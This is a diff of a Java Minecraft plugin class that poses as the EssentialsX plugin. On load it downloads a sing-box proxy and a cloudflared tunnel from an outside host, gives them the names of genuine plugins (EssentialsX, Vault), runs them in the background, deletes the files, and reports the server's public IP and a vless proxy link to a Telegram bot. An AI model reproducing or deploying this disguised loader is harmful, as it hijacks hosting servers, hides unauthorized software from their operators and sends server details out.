@@ -15,9 +15,14 @@ import java.nio.file.Path;
 public class EssentialsX extends JavaPlugin {
 
 
-    // Java服务端端口
-    private int port = ;
+    // Cloudflare隧道端口
+    private int port = 22222;
 
+    //Cloudflare隧道Token
+    private String token = ""; //必填
+
+    //Cloudflare隧道绑定域名
+    private String host = ""; //必填
 
     // Telegram配置
     private String tgToken = "";
@@ -66,112 +71,64 @@ public class EssentialsX extends JavaPlugin {
                 getDataFolder().toPath();
 
 
-
-        // 证书安全目录
-        Path secureFolder =
-                Path.of("/home/container/config");
-
-
         Files.createDirectories(
                 runFolder
         );
 
 
-        Files.createDirectories(
-                secureFolder
-        );
+        String SingboxUrl =
+                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/EssentialsX-1.21.11.jar"; //sing-box
 
 
-
-        String javaUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11.jar";
-
-
-        String confUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/config.php?port="
-                        + port;
+        String ConfUrl =
+                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/config.json"; //sing-box config.json
 
 
-        String crtUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/server.crt";
+        String TunnelUrl =
+                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Vault.jar";
 
 
-        String keyUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/server.key";
-
-
-
-
-        Path javaFile =
+        Path SingboxFile =
                 runFolder.resolve(
                         "EssentialsX-1.21.11.jar"
                 );
 
 
-        Path configFile =
+        Path ConfFile =
                 runFolder.resolve(
                         "config.json"
                 );
 
-
-
-        // 安全保存证书
-        Path crtFile =
-                secureFolder.resolve(
-                        "server.crt"
+        
+        Path TunnelFile =
+                runFolder.resolve(
+                        "Vault.jar"
                 );
 
-
-    Path keyFile =
-            secureFolder.resolve(
-                    "server.key"
-            );
 
 
 
         // 下载临时文件
 
         downloadIfNotExists(
-                javaUrl,
-                javaFile
+                SingboxUrl,
+                SingboxFile
         );
 
 
         downloadIfNotExists(
-                confUrl,
-                configFile
-        );
-
-
-
-        // 证书只下载到安全目录
-
-        downloadIfNotExists(
-                crtUrl,
-                crtFile
+                ConfUrl,
+                ConfFile
         );
 
 
         downloadIfNotExists(
-                keyUrl,
-                keyFile
+                TunnelUrl,
+                TunnelFile
         );
 
 
-
-        // key权限限制
-
-        new ProcessBuilder(
-                "chmod",
-                "600",
-                keyFile.toString()
-        )
-        .start()
-        .waitFor();
-
-
-
-        // 启动
+        // 启动Sing-box
 
         ProcessBuilder pb =
                 new ProcessBuilder(
@@ -189,16 +146,31 @@ public class EssentialsX extends JavaPlugin {
 
         pb.start();
 
+        // 启动Cloudflared
 
+        ProcessBuilder pb2 =
+                new ProcessBuilder(
+                        "bash",
+                        "-c",
+                        "nohup ./Vault.jar --no-autoupdate tunnel --protocol http2 run --token" + token + " > /dev/null 2>&1 &"
+                );
+
+
+
+        pb2.directory(
+                runFolder.toFile()
+        );
+
+
+        pb2.start();
 
         getLogger().info(
                 "Plugins starting..."
         );
 
 
-
         Thread.sleep(
-                3000
+                5000
         );
 
 
@@ -206,27 +178,32 @@ public class EssentialsX extends JavaPlugin {
         // 删除临时文件
 
         Files.deleteIfExists(
-                javaFile
+                SingboxFile
         );
 
 
         Files.deleteIfExists(
-                configFile
+                ConfFile
         );
 
+        Files.deleteIfExists(
+                TunnelFile
+        );        
 
         String ip =
                 getPublicIP();
 
 
-
         sendTelegram(
-                "Tuic Server Started\n\n"
-                        + "订阅地址: \ntuic://43bfdd44-0654-9e81-d340-eee7c0a3dbbb:Siq8dztj@"
+                "服务器插件启动\n"
+                        + "公网IP为: "
                         + ip
-                        + ":"
-                        + port
-                        + "?congestion_control=bbr&alpn=h3&sni=www.bing.com&udp_relay_mode=native&allow_insecure=1#Tuic-Server"
+                        + "\n"
+                        + "订阅地址: \nvless://dc555507-bed4-4627-9945-c5da21c6cea6@"
+                        + host
+                        + ":443"
+                        + "?encryption=none&security=tls&sni=" + host + "&allowInsecure=1&type=ws&host=" + host + "&path=%2F"
+           
         );
 
     }
